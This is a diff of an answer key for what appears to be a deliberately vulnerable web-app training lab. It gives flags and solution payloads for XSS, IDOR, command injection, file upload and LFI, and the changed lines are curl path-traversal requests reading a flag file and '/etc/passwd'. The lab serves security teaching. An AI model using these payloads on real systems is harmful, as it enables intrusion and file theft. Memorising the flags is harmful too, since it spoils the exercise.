@@ -13,7 +13,7 @@ Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http
 | Reflected & Stored XSS | `FLAG{xss_st34ls_the_c00kie}` | steal the (non-HttpOnly) `flag` cookie via `document.cookie` |
 | IDOR | `FLAG{sql1_auth_byp4ss_and_1dor}` | `profile.php?id=1` → admin's note |
 | Command injection | `FLAG{c0mmand_1njection_rce_on_host}` | `;cat private/cmdi_flag.txt` via Net Tools |
-| LFI / traversal | `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}` | `?page=../private/flag.txt` |
+| LFI / traversal | `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}` | `?page=../../lfi_secret/flag.txt` |
 | File upload | `FLAG{w3bshell_upl0ad_to_rce}` | webshell → `cat private/upload_flag.txt` |
 | Info disclosure | `FLAG{c0nfig_backup_left_in_webroot}` | `GET /config.php.bak` |
 | Weak creds | admin's note (above) | log in as `admin` with the cracked/guessed password |
@@ -62,13 +62,18 @@ python3 -m http.server 9001
 **Result:** `uid=... ` appears below the ping output. **Reason:** `shell_exec("ping -c 1 ".$host)` — no escaping.
 
 ## 6. LFI / path traversal  (`index.php?page=`)
-**Answer:** `page` is included with no sanitisation.
+**Answer:** `page` is included with no sanitisation, so `../` escapes the `pages/` directory.
 **Command:**
 ```
-curl -sG "$U/index.php" --data-urlencode "page=../private/flag.txt"
-curl -sG "$U/index.php" --data-urlencode "page=../../../../../../../../etc/passwd"   # add enough ../ for your path
+# FLAG — a file OUTSIDE the web root, deterministic depth: only 2 ../ (extra ../ are harmless)
+curl -sG "$U/index.php" --data-urlencode "page=../../lfi_secret/flag.txt"
+# bonus: a system file — add ENOUGH ../ to reach / (depth depends on where the kit is installed,
+#        and may be blocked by open_basedir); the flag above is the reliable target
+curl -sG "$U/index.php" --data-urlencode "page=../../../../../../../etc/passwd"
 ```
-**Result:** `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}`, then `root:x:0:0:`. **Reason:** `include __DIR__."/pages/".$page`.
+**Result:** `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}` (and, with enough `../`, `root:x:0:0:`).
+**Reason:** `include __DIR__."/pages/".$page`; `lfi_secret/` is a sibling of `webapp/` (outside the docroot),
+so it is reachable only via traversal and always at exactly 2 `../` from `pages/`.
 
 ## 7. Insecure file upload  (`upload.php`)
 **Answer:** no extension/type check → upload a PHP webshell under the web root and run it.
